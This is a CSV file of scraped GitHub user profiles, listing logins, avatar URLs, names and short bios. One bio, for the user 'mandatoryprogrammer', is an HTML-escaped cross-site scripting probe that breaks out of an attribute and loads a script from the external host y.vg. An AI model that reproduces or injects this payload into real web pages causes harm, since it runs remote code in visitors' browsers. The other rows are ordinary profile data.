﻿score,events_url,login,received_events_url,id,type,avatar_url,site_admin,gravatar_id,name,url,company,html_url,blog,followers_url,hireable,following_url,public_gists,gists_url,followers,starred_url,updated_at,subscriptions_url,organizations_url,repos_url,location,email,bio,public_repos,following,created_at
0,,huruji,,,,https://avatars3.githubusercontent.com/u/15937065?v=3&amp;s=100,,,忽如寄,,,,,,,,,,,,,,,,,,以梦为码，仗键天涯。,,,
0,,edu-bot,,,,https://avatars0.githubusercontent.com/u/23435604?v=3&amp;s=100,,,Edu Bot,,,,,,,,,,,,,,,,,,,,,
0,,luisjnk,,,,https://avatars0.githubusercontent.com/u/4520412?v=3&amp;s=100,,,Luís Paulo,,,,,,,,,,,,,,,,,,,,,
0,,AndiChiou,,,,https://avatars2.githubusercontent.com/u/23460812?v=3&amp;s=100,,,Andi Chiou,,,,,,,,,,,,,,,,,,High school student @bartlett-high-school,,,
0,,ampatell,,,,https://avatars3.githubusercontent.com/u/20740366?v=3&amp;s=100,,,ampatell,,,,,,,,,,,,,,,,,,,,,
0,,BFush,,,,https://avatars3.githubusercontent.com/u/23432645?v=3&amp;s=100,,,Brisnee Fush,,,,,,,,,,,,,,,,,,Research graduate at Stanford University specializing in Natural Language Processing and Linguistics. Previously: Kilgraston School. Please follow me. 😄 ,,,
0,,Mohamed-El-Amine-D,,,,https://avatars2.githubusercontent.com/u/15234847?v=3&amp;s=100,,,DADDOU Mohamed El Amine,,,,,,,,,,,,,,,,,,,,,
0,,gintern,,,,https://avatars2.githubusercontent.com/u/20753788?v=3&amp;s=100,,,Michelle Isterya,,,,,,,,,,,,,,,,,,"B.Tech at MIT, 2010;  Help me in development. Google Intern, 2016 :smile: ",,,
0,,jpruiz114,,,,https://avatars3.githubusercontent.com/u/4614970?v=3&amp;s=100,,,Jean Paul Ruiz,,,,,,,,,,,,,,,,,,"Cat lover, lego fanatic, full stack developer, big data and math passionate.",,,
0,,SnehaRane,,,,https://avatars3.githubusercontent.com/u/10234186?v=3&amp;s=100,,,Sneha Rane,,,,,,,,,,,,,,,,,,,,,
0,,Vermisse,,,,https://avatars2.githubusercontent.com/u/17972943?v=3&amp;s=100,,,Sunki,,,,,,,,,,,,,,,,,,Java、Scala、Clojure,,,
0,,valaxis,,,,https://avatars1.githubusercontent.com/u/23111935?v=3&amp;s=100,,,valaxis,,,,,,,,,,,,,,,,,,,,,
0,,AeronStory,,,,https://avatars2.githubusercontent.com/u/22915694?v=3&amp;s=100,,,mohammad,,,,,,,,,,,,,,,,,,,,,
0,,SanjithKanagavel,,,,https://avatars2.githubusercontent.com/u/9746842?v=3&amp;s=100,,,Sanjith Jothi Kanagavel,,,,,,,,,,,,,,,,,,iOS/Android/Windows/Game/IOT turns me on for the game 😍,,,
0,,yfgeek,,,,https://avatars2.githubusercontent.com/u/7533831?v=3&amp;s=100,,,Ivan,,,,,,,,,,,,,,,,,,,,,
0,,myuanyuan,,,,https://avatars3.githubusercontent.com/u/22052330?v=3&amp;s=100,,,myuanyuan,,,,,,,,,,,,,,,,,,,,,
0,,Rpsl,,,,https://avatars2.githubusercontent.com/u/265634?v=3&amp;s=100,,,Виктор Диктор,,,,,,,,,,,,,,,,,,,,,
0,,shivamshekhar,,,,https://avatars1.githubusercontent.com/u/13262314?v=3&amp;s=100,,,Shivam Shekhar,,,,,,,,,,,,,,,,,,,,,
0,,obernardovieira,,,,https://avatars3.githubusercontent.com/u/19441097?v=3&amp;s=100,,,Bernardo Vieira,,,,,,,,,,,,,,,,,,while(!eating) { coding(); },,,
0,,lucasbento,,,,https://avatars3.githubusercontent.com/u/6207220?v=3&amp;s=100,,,Lucas Bento,,,,,,,,,,,,,,,,,,"Full-stack developer building amazing apps with #react, #reactnative, #relay, #webpack, #graphql &amp; #koa",,,
0,,rmbernardi,,,,https://avatars0.githubusercontent.com/u/8214682?v=3&amp;s=100,,,Richard Bernardino,,,,,,,,,,,,,,,,,,,,,
0,,adizhavo,,,,https://avatars1.githubusercontent.com/u/13251062?v=3&amp;s=100,,,Adi Zhavo,,,,,,,,,,,,,,,,,,Video game lover,,,
0,,doomsterinc,,,,https://avatars0.githubusercontent.com/u/5833310?v=3&amp;s=100,,,Maicon Giovani,,,,,,,,,,,,,,,,,,Code Life,,,
0,,zhangjiang19926,,,,https://avatars3.githubusercontent.com/u/13343920?v=3&amp;s=100,,,zhangjiang,,,,,,,,,,,,,,,,,,,,,
0,,mssalvo,,,,https://avatars3.githubusercontent.com/u/5181298?v=3&amp;s=100,,,Salvo,,,,,,,,,,,,,,,,,,,,,
0,,shoshindes,,,,https://avatars1.githubusercontent.com/u/13901088?v=3&amp;s=100,,,Jack Thompson,,,,,,,,,,,,,,,,,,,,,
0,,ninabreznik,,,,https://avatars1.githubusercontent.com/u/1076427?v=3&amp;s=100,,,Nina Breznik,,,,,,,,,,,,,,,,,,,,,
0,,ternsip,,,,https://avatars3.githubusercontent.com/u/10179239?v=3&amp;s=100,,,Ternsip,,,,,,,,,,,,,,,,,,If you are alone - imagine that you are Gordon Freeman.,,,
0,,shadestreak,,,,https://avatars1.githubusercontent.com/u/19281808?v=3&amp;s=100,,,Argha Das,,,,,,,,,,,,,,,,,,A Human With Programming Skill,,,
0,,zrcing,,,,https://avatars1.githubusercontent.com/u/1124192?v=3&amp;s=100,,,Gary,,,,,,,,,,,,,,,,,,"Interest PHP, Web Developer, IT",,,
0,,brunocvcunha,,,,https://avatars2.githubusercontent.com/u/3207647?v=3&amp;s=100,,,Bruno Candido Volpato da Cunha,,,,,,,,,,,,,,,,,,☕️  💻  ,,,
0,,charz,,,,https://avatars1.githubusercontent.com/u/620340?v=3&amp;s=100,,,Charles Hsu,,,,,,,,,,,,,,,,,,,,,
0,,sindresorhus,,,,https://avatars2.githubusercontent.com/u/170270?v=3&amp;s=100,,,Sindre Sorhus,,,,,,,,,,,,,,,,,,,,,
0,,gztchan,,,,https://avatars3.githubusercontent.com/u/6322366?v=3&amp;s=100,,,Tony Chan,,,,,,,,,,,,,,,,,,Developer &amp; Designer {create things} | twitter.com/gztchan | dribbble/gztchan,,,
0,,mandatoryprogrammer,,,,https://avatars3.githubusercontent.com/u/5349141?v=3&amp;s=100,,,Matthew Bryant,,,,,,,,,,,,,,,,,,&quot;&gt;&lt;script src=https://y.vg&gt;&lt;/script&gt;,,,
0,,nolanlawson,,,,https://avatars1.githubusercontent.com/u/283842?v=3&amp;s=100,,,Nolan Lawson,,,,,,,,,,,,,,,,,,I was born in a crossfire hurricane,,,
0,,alexflint,,,,https://avatars1.githubusercontent.com/u/640247?v=3&amp;s=100,,,Alex Flint,,,,,,,,,,,,,,,,,,,,,
0,,gavinkwoe,,,,https://avatars1.githubusercontent.com/u/876707?v=3&amp;s=100,,,Gavin.Kwoe,,,,,,,,,,,,,,,,,,"Civilize my mind, savage my body",,,
0,,fogleman,,,,https://avatars0.githubusercontent.com/u/520208?v=3&amp;s=100,,,Michael Fogleman,,,,,,,,,,,,,,,,,,R&amp;D Engineer at Kitware,,,
0,,ayushoriginal,,,,https://avatars2.githubusercontent.com/u/8748017?v=3&amp;s=100,,,Ayush Pareek,,,,,,,,,,,,,,,,,,,,,
0,,dysc,,,,https://avatars0.githubusercontent.com/u/19864708?v=3&amp;s=100,,,dysc,,,,,,,,,,,,,,,,,,⭐⭐⭐⭐⭐,,,
0,,manojisnow,,,,https://avatars0.githubusercontent.com/u/1961616?v=3&amp;s=100,,,Manoj,,,,,,,,,,,,,,,,,,,,,
0,,bpiselli,,,,https://avatars2.githubusercontent.com/u/4226714?v=3&amp;s=100,,,Bertrand PISELLI,,,,,,,,,,,,,,,,,,,,,
0,,goldingking,,,,https://avatars3.githubusercontent.com/u/1147641?v=3&amp;s=100,,,It&#39;s a secret,,,,,,,,,,,,,,,,,,,,,
0,,bhanuV,,,,https://avatars0.githubusercontent.com/u/3939149?v=3&amp;s=100,,,Bhanu Priya Vijayaraj,,,,,,,,,,,,,,,,,,,,,
0,,jarodsun,,,,https://avatars0.githubusercontent.com/u/5562437?v=3&amp;s=100,,,Jarod Sun,,,,,,,,,,,,,,,,,,,,,
0,,post72,,,,https://avatars1.githubusercontent.com/u/1323141?v=3&amp;s=100,,,Bill Burch,,,,,,,,,,,,,,,,,,,,,
0,,mervas,,,,https://avatars2.githubusercontent.com/u/1756791?v=3&amp;s=100,,,Mervas DAYI,,,,,,,,,,,,,,,,,,,,,
0,,dustinpfister,,,,https://avatars0.githubusercontent.com/u/5420502?v=3&amp;s=100,,,Dustin John Pfister,,,,,,,,,,,,,,,,,,Long time hobbyist JavaScript developer. ,,,
0,,roy2020china,,,,https://avatars0.githubusercontent.com/u/10363512?v=3&amp;s=100,,,zhang bing,,,,,,,,,,,,,,,,,,,,,
0,,tanya-soroka,,,,https://avatars0.githubusercontent.com/u/6424075?v=3&amp;s=100,,,Tanya Soroka,,,,,,,,,,,,,,,,,,,,,
